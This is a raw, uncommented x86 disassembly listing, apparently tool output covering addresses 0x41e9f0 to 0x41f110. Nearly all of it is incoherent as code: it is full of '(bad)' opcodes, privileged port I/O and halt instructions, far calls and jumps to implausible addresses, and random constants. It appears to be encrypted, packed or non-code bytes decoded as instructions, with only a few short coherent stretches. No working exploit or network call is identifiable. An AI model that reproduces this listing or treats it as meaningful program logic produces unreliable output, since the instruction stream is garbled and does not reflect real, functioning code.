  41e9f0:	xchg   ecx,eax
  41e9f1:	jbe    0x41ea25
  41e9f3:	fst    QWORD PTR [esi-0xd]
  41e9f6:	inc    ebp
  41e9f7:	jae    0x41ea32
  41e9f9:	mov    ecx,0xf1c08c6d
  41e9fe:	inc    eax
  41e9ff:	inc    edi
  41ea00:	xchg   ebx,eax
  41ea01:	adc    ch,BYTE PTR [ecx-0x56754f3f]
  41ea07:	xchg   esi,eax
  41ea08:	add    al,0xb6
  41ea0a:	pusha  
  41ea0b:	cld    
  41ea0c:	out    dx,al
  41ea0d:	add    BYTE PTR [ebx],bh
  41ea0f:	inc    ecx
  41ea10:	rcr    BYTE PTR [edx+esi*8],0xe9
  41ea14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea15:	xor    al,BYTE PTR [edi-0x9]
  41ea18:	test   eax,0xbf705c2
  41ea1d:	pop    ds
  41ea1e:	stos   BYTE PTR es:[edi],al
  41ea1f:	xchg   esi,eax
  41ea20:	and    ebx,0xffffffdd
  41ea23:	fld    DWORD PTR [edi]
  41ea25:	sbb    DWORD PTR [ebx],edi
  41ea27:	jmp    0x58139ce5
  41ea2c:	add    ecx,DWORD PTR [ebp-0x6f2b1ee9]
  41ea32:	sbb    edi,DWORD PTR [esi+0x5b69ffff]
  41ea38:	(bad)  
  41ea39:	push   0x61dbcedd
  41ea3e:	jnp    0x41ea4c
  41ea40:	sub    ebx,edx
  41ea42:	int    0x57
  41ea44:	xchg   ecx,eax
  41ea45:	sub    DWORD PTR [edx],esp
  41ea47:	inc    ecx
  41ea48:	jge    0x41e9f3
  41ea4a:	mov    dh,0xd2
  41ea4c:	mov    esp,0x8bfc6d99
  41ea51:	ror    edi,cl
  41ea53:	ss xchg ecx,eax
  41ea55:	push   ss
  41ea56:	in     eax,dx
  41ea57:	in     al,0xb1
  41ea59:	(bad)  
  41ea5a:	cld    
  41ea5b:	adc    DWORD PTR [eax+0x4b899f61],edi
  41ea61:	xchg   esi,eax
  41ea62:	xchg   ebx,eax
  41ea63:	loop   0x41ead2
  41ea65:	sbb    edi,DWORD PTR [ebx+0x27]
  41ea68:	push   esi
  41ea69:	mov    ebp,0xb2d5c31d
  41ea6e:	push   esi
  41ea6f:	sti    
  41ea70:	inc    eax
  41ea71:	test   eax,0x2eeb9245
  41ea76:	ret    
  41ea77:	outs   dx,BYTE PTR ds:[esi]
  41ea78:	xlat   BYTE PTR ds:[ebx]
  41ea79:	mov    ebp,ecx
  41ea7b:	jecxz  0x41ea08
  41ea7d:	ins    BYTE PTR es:[edi],dx
  41ea7e:	mov    ds:0x9bf4b857,al
  41ea83:	mov    dh,0x3c
  41ea85:	dec    ecx
  41ea86:	jecxz  0x41ea8e
  41ea88:	xor    bl,BYTE PTR [eax]
  41ea8a:	je     0x41eaea
  41ea8c:	cwde   
  41ea8d:	mov    eax,0xd49788e
  41ea92:	xchg   edx,eax
  41ea93:	mov    ds:0x7fb0317,eax
  41ea98:	mov    edx,0x89c93df0
  41ea9d:	test   al,0xf
  41ea9f:	xor    dh,BYTE PTR [esi]
  41eaa1:	ss sbb esp,0x3afa1e21
  41eaa8:	push   eax
  41eaa9:	mov    esp,0x9f471626
  41eaae:	push   0xfffffff1
  41eab0:	stos   BYTE PTR es:[edi],al
  41eab1:	popf   
  41eab2:	test   al,0xf9
  41eab4:	adc    esi,esi
  41eab6:	out    dx,eax
  41eab7:	dec    ecx
  41eab8:	aam    0x39
  41eaba:	adc    eax,0x7e924dbe
  41eabf:	sti    
  41eac0:	mov    bl,0x79
  41eac2:	out    0xde,al
  41eac4:	popf   
  41eac5:	push   ebx
  41eac6:	iret   
  41eac7:	add    DWORD PTR [ecx-0x116c51c7],ecx
  41eacd:	mov    ss,WORD PTR [eax]
  41eacf:	addr16 jge 0x41eaf1
  41ead2:	add    al,0x17
  41ead4:	test   DWORD PTR [esi-0x41],ecx
  41ead7:	sub    dl,cl
  41ead9:	jns    0x41eb10
  41eadb:	jbe    0x41eae4
  41eadd:	aaa    
  41eade:	lods   al,BYTE PTR ds:[esi]
  41eadf:	push   cs
  41eae0:	scas   al,BYTE PTR es:[edi]
  41eae1:	enter  0x9d5b,0xc
  41eae5:	xchg   esi,eax
  41eae6:	mov    al,BYTE PTR [ecx-0x4949e779]
  41eaec:	cmp    ch,ch
  41eaee:	cmp    eax,DWORD PTR [edx+eiz*1]
  41eaf1:	sub    BYTE PTR [ebx-0x4e],cl
  41eaf4:	lahf   
  41eaf5:	push   edx
  41eaf6:	mov    WORD PTR [ecx+0x5b],gs
  41eaf9:	mov    bh,0xaf
  41eafb:	push   edx
  41eafc:	jo     0x41eb67
  41eafe:	jmp    0xd7f0fade
  41eb03:	mov    edi,DWORD PTR [ebp-0x8]
  41eb06:	mov    ebx,DWORD PTR [ebp-0x10]
  41eb09:	sub    ebx,edi
  41eb0b:	jmp    0x41f01d
  41eb10:	ror    al,cl
  41eb12:	retf   0xcad0
  41eb15:	fcmovbe st,st(2)
  41eb17:	fcmovb st,st(3)
  41eb19:	mov    ebx,0x1394981f
  41eb1e:	xchg   ebx,eax
  41eb1f:	cmp    eax,0x787f42d6
  41eb24:	jae    0x41eba2
  41eb26:	js     0x41eba0
  41eb28:	jge    0x41eb00
  41eb2a:	mov    dh,0x86
  41eb2c:	ss ins DWORD PTR es:[edi],dx
  41eb2e:	dec    edi
  41eb2f:	inc    edi
  41eb31:	aad    0x30
  41eb33:	jns    0x41eb07
  41eb35:	pop    eax
  41eb36:	fwait
  41eb37:	ins    BYTE PTR es:[edi],dx
  41eb38:	aas    
  41eb39:	push   esi
  41eb3a:	fdivr  QWORD PTR [eax]
  41eb3c:	cdq    
  41eb3d:	jae    0x41eac7
  41eb3f:	dec    esi
  41eb40:	ja     0x41ebbf
  41eb42:	mov    ebx,0x82cc10a7
  41eb47:	pop    ds
  41eb48:	cli    
  41eb49:	sub    esp,DWORD PTR [edi+0x7]
  41eb4c:	out    dx,eax
  41eb4d:	mov    cl,0xde
  41eb4f:	push   ebx
  41eb50:	popa   
  41eb51:	sbb    BYTE PTR [esi+0x51],cl
  41eb54:	sub    eax,0x4c18a7f5
  41eb59:	mov    DWORD PTR [ecx],ecx
  41eb5b:	(bad)  
  41eb5c:	aam    0x83
  41eb5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb5f:	fwait
  41eb60:	sub    esi,DWORD PTR [ebp-0x6b]
  41eb63:	aas    
  41eb64:	ja     0x41eb9c
  41eb66:	inc    esp
  41eb67:	sbb    ecx,ecx
  41eb69:	adc    dl,dh
  41eb6b:	mov    al,BYTE PTR [edx]
  41eb6d:	add    ah,BYTE PTR ds:[edi-0x5bc6f536]
  41eb74:	pop    edi
  41eb76:	xchg   esi,eax
  41eb77:	into   
  41eb78:	xor    edi,DWORD PTR [ebp+eax*2-0x3]
  41eb7c:	mov    ebx,0xf0cb1a66
  41eb81:	sti    
  41eb82:	adc    esp,DWORD PTR [ecx]
  41eb84:	sar    DWORD PTR ds:0x853c9fbe,1
  41eb8a:	inc    ecx
  41eb8b:	inc    ebp
  41eb8c:	mov    gs,WORD PTR [eax-0x3a9a10d5]
  41eb92:	mov    al,ds:0xec6bdef9
  41eb97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eb98:	adc    DWORD PTR [esi],esi
  41eb9a:	and    cl,dl
  41eb9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb9d:	int    0x8
  41eb9f:	push   ebx
  41eba0:	adc    bl,BYTE PTR [ebp+eax*2-0x73f386cb]
  41eba7:	or     al,0x1e
  41eba9:	sub    bl,ch
  41ebab:	test   al,0xf
  41ebad:	adc    bh,BYTE PTR [edi]
  41ebaf:	inc    eax
  41ebb0:	cmp    DWORD PTR [ebx+0x596245da],0x5560f126
  41ebba:	dec    dx
  41ebbc:	inc    ecx
  41ebbd:	dec    edx
  41ebbe:	cs mov ch,0x94
  41ebc1:	mov    esi,0x7f5bb558
  41ebc6:	mov    ebp,0x9951ce57
  41ebcb:	fcmovu st,st(0)
  41ebcd:	mov    cl,0xf7
  41ebcf:	std    
  41ebd0:	add    esp,DWORD PTR [esi]
  41ebd2:	hlt    
  41ebd3:	and    cl,BYTE PTR [eax-0x6ce4405]
  41ebd9:	xchg   ebp,eax
  41ebda:	call   0xa1e63b81
  41ebdf:	jae    0x41ec20
  41ebe1:	rcr    edi,1
  41ebe3:	xchg   ebp,eax
  41ebe4:	add    ecx,ebp
  41ebe6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ebe7:	ss cmp al,0x3e
  41ebea:	sti    
  41ebeb:	xchg   ecx,eax
  41ebec:	push   edi
  41ebed:	test   BYTE PTR [esi],0x7d
  41ebf0:	sbb    al,0xf8
  41ebf2:	mov    esp,0xc7389761
  41ebf7:	icebp  
  41ebf8:	mov    eax,0x2184c7d0
  41ebfd:	sahf   
  41ebfe:	push   esp
  41ebff:	scas   eax,DWORD PTR es:[edi]
  41ec00:	push   ds
  41ec01:	push   0xef06e84b
  41ec06:	cmp    eax,0xb0389aab
  41ec0b:	test   cl,ch
  41ec0d:	enter  0x1ef7,0xa4
  41ec11:	cdq    
  41ec12:	mov    ch,0xab
  41ec14:	push   ss
  41ec15:	fcmovnbe st,st(7)
  41ec17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec18:	aaa    
  41ec19:	daa    
  41ec1a:	cs cdq 
  41ec1c:	and    bl,BYTE PTR [ebx+0xf1de8f3]
  41ec22:	pusha  
  41ec23:	test   BYTE PTR [ebx-0x35acfbe0],cl
  41ec29:	jns    0x41ebf5
  41ec2b:	(bad)  
  41ec2c:	cmp    eax,0x6fb486d
  41ec31:	fs push eax
  41ec33:	mov    dl,0xc4
  41ec35:	out    dx,eax
  41ec36:	mov    DWORD PTR [ebp-0x56],esi
  41ec39:	jnp    0x41ebbf
  41ec3b:	xor    DWORD PTR [ebp-0x5e],0x9c6d76cd
  41ec42:	addr16 inc esp
  41ec44:	xchg   ebp,eax
  41ec45:	jle    0x41ebde
  41ec47:	shl    ebx,cl
  41ec49:	fsubr  QWORD PTR [edi+0x21]
  41ec4c:	xchg   edi,eax
  41ec4d:	jle    0x41ec74
  41ec4f:	mov    ds:0xa1cd268,al
  41ec54:	into   
  41ec55:	add    al,0x51
  41ec57:	mov    dl,ch
  41ec59:	mov    ds:0x483ede,al
  41ec5e:	aas    
  41ec5f:	lahf   
  41ec60:	pop    esp
  41ec61:	xchg   BYTE PTR [edx],bl
  41ec63:	in     eax,0x25
  41ec65:	dec    ebp
  41ec66:	xchg   edx,eax
  41ec67:	xor    eax,0x3f714a79
  41ec6c:	fdivr  QWORD PTR [edx-0x27]
  41ec6f:	mov    esp,DWORD PTR [ebx-0x639aa5a0]
  41ec75:	stos   DWORD PTR es:[edi],eax
  41ec76:	test   DWORD PTR [ebx+0x9fae2bd],ebp
  41ec7c:	xchg   edx,eax
  41ec7d:	xor    al,0x76
  41ec7f:	adc    al,BYTE PTR [edx-0x6f]
  41ec82:	test   al,0xa3
  41ec84:	pushf  
  41ec85:	pop    eax
  41ec86:	lahf   
  41ec87:	pusha  
  41ec88:	jnp    0x41ecdf
  41ec8a:	and    cl,BYTE PTR [edi+ebp*4+0x307b3bb7]
  41ec91:	ds mov cl,0xc6
  41ec94:	or     eax,0x6d900d01
  41ec99:	test   esp,ebp
  41ec9b:	imul   esi,DWORD PTR [eax],0x1ebdb729
  41eca1:	addr16 mov ebx,0xda04c120
  41eca7:	xchg   esp,eax
  41eca8:	pop    ecx
  41eca9:	pop    edi
  41ecaa:	xor    esp,DWORD PTR [edx]
  41ecac:	xchg   esi,eax
  41ecad:	xchg   ecx,eax
  41ecae:	pop    ss
  41ecaf:	ja     0x41ec47
  41ecb1:	or     al,0x25
  41ecb3:	dec    esi
  41ecb4:	stc    
  41ecb5:	(bad)  
  41ecb7:	loope  0x41ed0e
  41ecb9:	loope  0x41ecd9
  41ecbb:	push   ss
  41ecbc:	sub    ch,BYTE PTR [ebx]
  41ecbe:	sbb    eax,0xeb2b2610
  41ecc3:	ja     0x41ec62
  41ecc5:	pushf  
  41ecc6:	push   edi
  41ecc7:	mov    al,0x2f
  41ecc9:	sbb    ah,BYTE PTR [esi-0x7904bfe]
  41eccf:	stc    
  41ecd0:	cmp    DWORD PTR [ebx+eax*2+0x70],ebp
  41ecd4:	jl     0x41eca2
  41ecd6:	mov    cl,0x50
  41ecd8:	cmp    al,0x2a
  41ecda:	test   BYTE PTR [edx+edi*2],bl
  41ecdd:	push   ebx
  41ecde:	outs   dx,BYTE PTR ds:[esi]
  41ecdf:	adc    al,BYTE PTR [esi]
  41ece1:	push   0xd9a9a042
  41ece6:	sub    al,0xd6
  41ece8:	jb     0x41ece7
  41ecea:	jbe    0x41ed32
  41ecec:	shl    DWORD PTR [eax-0x574e0862],0x72
  41ecf3:	mov    esp,0x285892a6
  41ecf8:	jnp    0x41ec8a
  41ecfa:	adc    BYTE PTR [ecx-0x64],ah
  41ecfd:	repz mov bl,0x11
  41ed00:	mov    ds:0x9ccd766f,al
  41ed05:	sbb    al,0x9
  41ed07:	fmul   QWORD PTR [edi+0x3c]
  41ed0a:	arpl   WORD PTR [ebp-0x5c],di
  41ed0d:	out    dx,al
  41ed0e:	pop    esp
  41ed0f:	xchg   edx,eax
  41ed10:	mov    ah,0x45
  41ed12:	lds    ecx,FWORD PTR ds:0xb3af31b8
  41ed18:	xchg   BYTE PTR [eax],bl
  41ed1a:	test   DWORD PTR [ecx-0xaa66a75],esi
  41ed20:	push   es
  41ed21:	push   esp
  41ed22:	fwait
  41ed23:	add    esp,ebp
  41ed25:	pop    ecx
  41ed26:	mov    BYTE PTR [ebp-0x77],ah
  41ed29:	loop   0x41ed7b
  41ed2b:	sbb    bh,bl
  41ed2d:	iret   
  41ed2e:	jecxz  0x41ed86
  41ed30:	hlt    
  41ed31:	mov    al,ds:0xa4e58646
  41ed36:	inc    esi
  41ed37:	lahf   
  41ed38:	faddp  st(6),st
  41ed3a:	adc    ebp,DWORD PTR [edx]
  41ed3c:	push   ebx
  41ed3d:	jbe    0x41ece4
  41ed3f:	sbb    eax,0xd576809b
  41ed44:	inc    esi
  41ed45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed46:	rcr    BYTE PTR [esi+0x2],0x7d
  41ed4a:	call   0xf65d:0x87a68ff2
  41ed51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed52:	push   ds
  41ed53:	pop    ecx
  41ed54:	push   ss
  41ed55:	push   ecx
  41ed56:	call   DWORD PTR [ecx+edx*4-0x38]
  41ed5a:	ds es xor al,0xaa
  41ed5e:	rcr    BYTE PTR [edx+edi*8+0x17],cl
  41ed62:	dec    esp
  41ed63:	adc    al,0x36
  41ed65:	fisttp WORD PTR [eax-0x5]
  41ed68:	xlat   BYTE PTR ds:[ebx]
  41ed69:	mov    bh,0xc
  41ed6b:	mov    esp,0xf62591e
  41ed70:	sbb    BYTE PTR [eax+edi*1+0x5cad11ec],ch
  41ed77:	cmp    cl,BYTE PTR [eax]
  41ed79:	pop    edx
  41ed7a:	loop   0x41edd9
  41ed7c:	mov    dh,0x41
  41ed7e:	mov    esi,0xdd08648f
  41ed83:	int3   
  41ed84:	sub    BYTE PTR [esi-0x5e1f3a16],0x83
  41ed8b:	sbb    DWORD PTR [esi],ecx
  41ed8d:	mov    ch,0x6a
  41ed8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ed90:	mov    BYTE PTR [ebx-0x37],cl
  41ed93:	(bad)  
  41ed94:	div    BYTE PTR [edi-0x7cccb260]
  41ed9a:	mov    dl,0xc9
  41ed9c:	jno    0x41ed3b
  41ed9e:	pushf  
  41ed9f:	pop    edx
  41eda0:	xor    eax,0x6064a2d
  41eda5:	mov    BYTE PTR [edx+0x16ea080b],bh
  41edab:	dec    edx
  41edac:	pop    ds
  41edad:	push   edx
  41edae:	mov    esi,0x48f4c2ec
  41edb3:	das    
  41edb4:	adc    ecx,DWORD PTR [edx]
  41edb6:	shl    esi,0xe4
  41edb9:	xchg   esp,eax
  41edba:	mov    ecx,0xa060f02c
  41edbf:	xchg   ecx,eax
  41edc0:	(bad)
  41edc5:	retf   0xf175
  41edc8:	call   0x2790ee2a
  41edcd:	fldcw  WORD PTR [edx+0xf]
  41edd0:	(bad)  
  41edd1:	loop   0x41ed5a
  41edd3:	adc    DWORD PTR [edi+eax*1-0x80],eax
  41edd7:	or     ebp,esp
  41edd9:	or     dl,BYTE PTR [esi-0x70]
  41eddc:	fist   DWORD PTR [edx+ebp*1+0x42]
  41ede0:	cmp    BYTE PTR [ebx],ah
  41ede2:	add    ch,dl
  41ede4:	jo     0x41ee1a
  41ede6:	sub    DWORD PTR [ebx],0x2c
  41ede9:	xchg   DWORD PTR [edi+eax*4],ebx
  41edec:	cwde   
  41eded:	jbe    0x41ee08
  41edef:	push   0x49cfdaea
  41edf4:	adc    eax,0x2f04c8dc
  41edf9:	push   ecx
  41edfa:	dec    BYTE PTR [edx]
  41edfc:	jmp    0x41edb6
  41edfe:	lock or DWORD PTR [ecx],ecx
  41ee01:	rcl    BYTE PTR [edi],1
  41ee03:	(bad)  
  41ee04:	sbb    al,0x86
  41ee06:	dec    edx
  41ee07:	(bad)  
  41ee08:	pop    ebx
  41ee09:	sbb    ecx,DWORD PTR [edx-0x15]
  41ee0c:	cmp    al,0x2
  41ee0e:	xor    ebp,0x15
  41ee11:	sbb    ch,BYTE PTR [edx]
  41ee13:	test   eax,0xae49055b
  41ee18:	fld    TBYTE PTR [eax-0x15d31e92]
  41ee1e:	or     bh,BYTE PTR [ecx+0x6f]
  41ee21:	jns    0x41ee07
  41ee23:	rol    DWORD PTR gs:[edi-0x5b9001cd],0x60
  41ee2b:	mov    dh,0x9f
  41ee2d:	mov    al,ds:0xd9e0a382
  41ee32:	ret    
  41ee33:	shl    esi,1
  41ee35:	mov    ds:0x21991735,al
  41ee3a:	inc    esp
  41ee3b:	push   ebx
  41ee3c:	adc    eax,ebp
  41ee3e:	jg     0x41ee54
  41ee40:	dec    ebp
  41ee41:	lods   eax,DWORD PTR ds:[esi]
  41ee42:	jno    0x41ee23
  41ee44:	and    BYTE PTR [ebp+0x76],dl
  41ee47:	mov    bh,0xec
  41ee49:	fst    DWORD PTR [ebx]
  41ee4b:	pop    esi
  41ee4c:	cwde   
  41ee4d:	and    ecx,DWORD PTR [edi]
  41ee4f:	daa    
  41ee50:	inc    edi
  41ee51:	shl    DWORD PTR [esp+ebx*2+0x4a478a8d],1
  41ee58:	jmp    0x9b7b46d8
  41ee5d:	mov    al,0x64
  41ee5f:	xchg   edx,eax
  41ee60:	popa   
  41ee61:	out    0x99,eax
  41ee63:	aaa    
  41ee64:	cdq    
  41ee65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee66:	popa   
  41ee67:	ss out dx,eax
  41ee69:	test   DWORD PTR [ebp*1+0x63cccd64],edx
  41ee70:	inc    eax
  41ee71:	shl    dh,cl
  41ee73:	mov    dl,0xd4
  41ee75:	cmp    eax,0x1479dcfe
  41ee7a:	in     al,0x53
  41ee7c:	cmp    al,0x93
  41ee7e:	mov    BYTE PTR [ebx+eax*1-0x73],0xf5
  41ee83:	stos   BYTE PTR es:[edi],al
  41ee84:	mov    esi,0x8a5f6f44
  41ee89:	jae    0x41ee56
  41ee8b:	push   0x9db0637f
  41ee90:	mov    ebx,0x3fdf2d10
  41ee95:	sub    edi,edx
  41ee97:	inc    ebp
  41ee98:	mov    al,BYTE PTR [ebx-0x2e9faf86]
  41ee9e:	push   ss
  41ee9f:	adc    BYTE PTR [edx-0x5d],dh
  41eea2:	outs   dx,BYTE PTR ds:[esi]
  41eea3:	stos   DWORD PTR es:[edi],eax
  41eea4:	mov    DWORD PTR [edi],ecx
  41eea6:	pop    ebp
  41eea7:	xor    ch,ch
  41eea9:	push   0xf40ba658
  41eeae:	imul   edx,DWORD PTR [esi+edi*2-0x55f95e76],0xa0da4919
  41eeb9:	and    DWORD PTR [ecx+0x6],edi
  41eebc:	fwait
  41eebd:	scas   al,BYTE PTR es:[edi]
  41eebe:	jb     0x41ee89
  41eec0:	sub    ebx,ebx
  41eec2:	push   es
  41eec3:	pop    eax
  41eec4:	jp     0x41ee99
  41eec6:	xor    BYTE PTR [ebp-0x5a264b6e],ah
  41eecc:	cld    
  41eecd:	fdiv   st,st(1)
  41eecf:	pushf  
  41eed0:	(bad)  
  41eed1:	fdiv   DWORD PTR [ecx+0x2b]
  41eed4:	inc    ecx
  41eed5:	pop    esi
  41eed6:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eed8:	adc    al,0xef
  41eeda:	aaa    
  41eedb:	imul   ebp,DWORD PTR [ecx-0x62],0xb0a1335a
  41eee2:	icebp  
  41eee3:	jnp    0x41ef5a
  41eee5:	sbb    BYTE PTR [esi],0x9d
  41eee8:	test   al,0xc1
  41eeea:	push   esi
  41eeeb:	mov    eax,ds:0x4f87f395
  41eef0:	adc    ch,0x6b
  41eef3:	and    ah,dh
  41eef5:	mov    dh,0x17
  41eef7:	xor    eax,0x2981dcef
  41eefc:	aad    0x65
  41eefe:	xchg   edx,eax
  41eeff:	outs   dx,DWORD PTR ds:[esi]
  41ef00:	retf   0x1126
  41ef03:	mov    bh,0x58
  41ef05:	fild   DWORD PTR [eax]
  41ef07:	pop    esi
  41ef08:	mov    eax,ds:0x7c8a1ed9
  41ef0d:	jmp    0x567a95d6
  41ef12:	push   edx
  41ef13:	push   edi
  41ef14:	push   ss
  41ef15:	ss or  eax,0xab5dd544
  41ef1b:	push   cs
  41ef1c:	mov    ah,0x8a
  41ef1e:	stc    
  41ef1f:	lods   eax,DWORD PTR ds:[esi]
  41ef20:	retf   0x702f
  41ef23:	mov    eax,0x5746da98
  41ef28:	mov    ah,0x1
  41ef2a:	mov    bh,0x73
  41ef2c:	pop    ebp
  41ef2d:	cwde   
  41ef2e:	(bad)  
  41ef2f:	(bad)  
  41ef31:	cmp    eax,0x56cd4115
  41ef36:	sbb    dh,cl
  41ef38:	cs sbb al,0xc4
  41ef3b:	mov    ebp,0xe5ef98a8
  41ef40:	cs pusha 
  41ef42:	sub    al,BYTE PTR [esi]
  41ef44:	xor    DWORD PTR [ebp-0x184e2fa5],eax
  41ef4a:	test   al,ah
  41ef4c:	push   ecx
  41ef4d:	add    al,0xe9
  41ef4f:	xor    bh,BYTE PTR [ecx-0x42]
  41ef52:	mov    edi,eax
  41ef54:	ret    
  41ef55:	add    esi,edx
  41ef57:	out    0x46,al
  41ef59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef5a:	mov    ebp,0x8806b99e
  41ef5f:	mov    DWORD PTR ds:0xe2b00f71,0x959ad86
  41ef69:	test   al,bh
  41ef6b:	push   esp
  41ef6c:	call   0xc826971d
  41ef71:	xchg   edx,eax
  41ef72:	scas   eax,DWORD PTR es:[edi]
  41ef73:	int3   
  41ef74:	test   eax,0x990318b
  41ef79:	mov    dh,0x85
  41ef7b:	push   cs
  41ef7c:	call   0xbbf:0xecb94904
  41ef83:	mov    BYTE PTR [ebx+0x7461afcf],bl
  41ef89:	shl    BYTE PTR [eax-0x39],cl
  41ef8c:	ins    BYTE PTR es:[edi],dx
  41ef8d:	sub    ebx,esp
  41ef8f:	hlt    
  41ef90:	sbb    al,0x28
  41ef92:	push   ss
  41ef93:	adc    eax,0x5b1dcd25
  41ef98:	or     BYTE PTR [esi+0xa],al
  41ef9b:	out    0x4b,eax
  41ef9d:	and    ebx,0xfffffff3
  41efa0:	and    cl,cl
  41efa2:	or     ebx,DWORD PTR [eax-0x6cd5084c]
  41efa8:	xchg   edi,edi
  41efaa:	cmp    DWORD PTR [ebx],esi
  41efac:	sub    DWORD PTR [edx],ecx
  41efae:	or     BYTE PTR [edx-0x677c8ec6],dl
  41efb4:	sbb    esi,DWORD PTR [ebp-0x71]
  41efb7:	fwait
  41efb8:	fs fs dec esi
  41efbb:	mov    ah,0x6
  41efbd:	daa    
  41efbe:	aam    0x4a
  41efc0:	in     al,0xf0
  41efc2:	jg     0x41ef95
  41efc4:	lods   al,BYTE PTR ds:[esi]
  41efc5:	pop    edi
  41efc6:	add    eax,0x4c647196
  41efcb:	and    BYTE PTR [ebx],al
  41efcd:	jp     0x41efda
  41efcf:	sbb    edi,eax
  41efd1:	into   
  41efd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41efd3:	pusha  
  41efd4:	or     bh,BYTE PTR [edx+0x44]
  41efd7:	arpl   WORD PTR [ebp+0x71],bx
  41efda:	dec    esi
  41efdb:	in     al,dx
  41efdc:	push   ecx
  41efdd:	pop    ecx
  41efde:	adc    dh,BYTE PTR [edi+0x1a]
  41efe1:	xchg   BYTE PTR [ecx-0x4f],al
  41efe4:	call   0xd332:0x4e8070f
  41efeb:	idiv   edx
  41efed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41efee:	pusha  
  41efef:	xchg   edx,eax
  41eff0:	cmp    cl,bh
  41eff2:	inc    ecx
  41eff3:	out    dx,eax
  41eff4:	sub    DWORD PTR [ecx],esp
  41eff6:	push   cs
  41eff7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eff8:	push   esp
  41eff9:	div    BYTE PTR [esi+0x5e910dc2]
  41efff:	icebp  
  41f000:	in     eax,dx
  41f001:	xchg   esp,eax
  41f002:	pop    edx
  41f003:	sbb    DWORD PTR [ecx+0x6f],edi
  41f006:	hlt    
  41f007:	loope  0x41f058
  41f009:	mul    BYTE PTR [ebx]
  41f00b:	cmp    ch,BYTE PTR [eax]
  41f00d:	push   es
  41f00e:	idiv   DWORD PTR [esi+0x5e377678]
  41f014:	jno    0xcdd91b01
  41f01a:	hlt    
  41f01b:	leave  
  41f01c:	enter  0xda3b,0xe9
  41f020:	or     eax,0xd6000005
  41f025:	ret    0xd1c2
  41f028:	fcmovbe st,st(1)
  41f02a:	aad    0xc9
  41f02c:	fs pop esp
  41f02e:	inc    esi
  41f02f:	mov    bh,BYTE PTR [ebp-0x36710dbd]
  41f035:	inc    ebp
  41f036:	jg     0x41f0b0
  41f038:	jae    0x41f0b6
  41f03a:	js     0x41f0b4
  41f03c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f03d:	push   edx
  41f03e:	stos   BYTE PTR es:[edi],al
  41f03f:	cmp    al,0x12
  41f041:	inc    ebx
  41f042:	and    BYTE PTR [bp+si+0x51],dl
  41f046:	aaa    
  41f047:	aas    
  41f048:	shl    BYTE PTR [ecx+edx*4+0x5f19af29],cl
  41f04f:	leave  
  41f050:	sub    edx,DWORD PTR [ecx]
  41f052:	sbb    eax,0x51299d3e
  41f057:	sbb    ebx,ebp
  41f059:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f05a:	xlat   BYTE PTR ds:[ebx]
  41f05b:	loope  0x41f09d
  41f05d:	jb     0x41eff7
  41f05f:	dec    edi
  41f060:	add    ebp,edi
  41f062:	push   0xffffffd9
  41f064:	jne    0x41f09d
  41f066:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f067:	cmp    DWORD PTR [esi],eax
  41f069:	push   ebp
  41f06a:	xchg   BYTE PTR [eax],dl
  41f06c:	dec    esi
  41f06d:	mov    edx,0x993f2475
  41f072:	mov    esp,0x837e7980
  41f077:	mov    edx,0x8bfee0a
  41f07c:	inc    eax
  41f07d:	push   eax
  41f07e:	loop   0x41f008
  41f080:	(bad)  
  41f081:	jge    0x41f0a0
  41f083:	mov    ch,0xa1
  41f085:	cmp    al,0xf3
  41f087:	mov    ah,0xf0
  41f089:	cs data16 scas al,BYTE PTR es:[edi]
  41f08c:	pop    ecx
  41f08d:	add    DWORD PTR [edi+0x2a],0x2e6fc97e
  41f094:	(bad)  
  41f095:	fidivr WORD PTR [edi+0x24e59d08]
  41f09b:	mov    ah,0x17
  41f09d:	mov    ecx,0x10a41c80
  41f0a2:	push   ebp
  41f0a3:	push   es
  41f0a4:	pop    eax
  41f0a5:	repnz inc edi
  41f0a7:	cs sub eax,0x210099e8
  41f0ad:	sub    eax,0x88800d95
  41f0b2:	mov    esp,0x7f00bc6f
  41f0b7:	pop    es
  41f0b8:	mov    bl,0xc4
  41f0ba:	inc    ecx
  41f0bb:	mov    esi,0x64ccd77
  41f0c0:	inc    esp
  41f0c1:	test   BYTE PTR [esi-0x2288d986],dl
  41f0c7:	and    DWORD PTR [esi],0x7e906ca2
  41f0cd:	mov    dl,0x82
  41f0cf:	mov    al,ds:0x34e837fc
  41f0d4:	iret   
  41f0d5:	xchg   edi,eax
  41f0d6:	xchg   ebp,eax
  41f0d7:	popf   
  41f0d8:	aam    0x7b
  41f0da:	mov    eax,ds:0x68115dc
  41f0df:	test   al,0xc3
  41f0e1:	stc    
  41f0e2:	popf   
  41f0e3:	rcl    DWORD PTR [edx],1
  41f0e5:	add    ch,ah
  41f0e7:	push   edi
  41f0e8:	(bad)  
  41f0e9:	push   ebp
  41f0ea:	mov    esp,0xd81db83f
  41f0ef:	push   ebx
  41f0f0:	mov    dl,BYTE PTR [eax+0x39]
  41f0f3:	ins    DWORD PTR es:[edi],dx
  41f0f4:	jp     0x41f12b
  41f0f6:	(bad)  
  41f0f7:	loope  0x41f109
  41f0f9:	test   BYTE PTR [eax],bl
  41f0fb:	fcmovne st,st(1)
  41f0fd:	add    edx,DWORD PTR [eax-0x77cb7285]
  41f103:	push   edi
  41f104:	add    BYTE PTR [edi-0x548292f9],al
  41f10a:	test   al,0x5b
  41f10c:	test   BYTE PTR [ebx+ecx*8-0x1c],ch
  41f110:	mov    cl,0xf5
